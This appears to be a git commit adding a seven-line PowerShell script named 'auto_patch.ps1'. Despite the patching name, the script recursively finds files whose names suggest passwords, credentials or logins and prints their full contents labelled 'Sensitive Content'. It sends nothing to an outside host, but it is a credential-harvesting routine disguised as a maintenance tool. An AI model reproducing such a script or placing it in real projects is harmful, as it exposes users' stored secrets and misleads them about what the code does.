fe56f77573e73964aeea3a9b488c897d4f18c1f4
TheOfficeIT <charlesminerr@gmail.com>
2025-06-04 12:20:38 +0300

    Create auto_patch.ps1

---
+++ auto_patch.ps1
@@ -0,0 +1,7 @@
+Get-ChildItem -Path $PSScriptRoot -Recurse -Include '*pwd*', '*pass*', '*creds*', '*login*' | ForEach-Object {
+@'
+--------------------------
+File name - {0}
+Sensitive Content - {1}
+--------------------------
+'@ -f $_.Name, (Get-Content $_.FullName -Raw)}
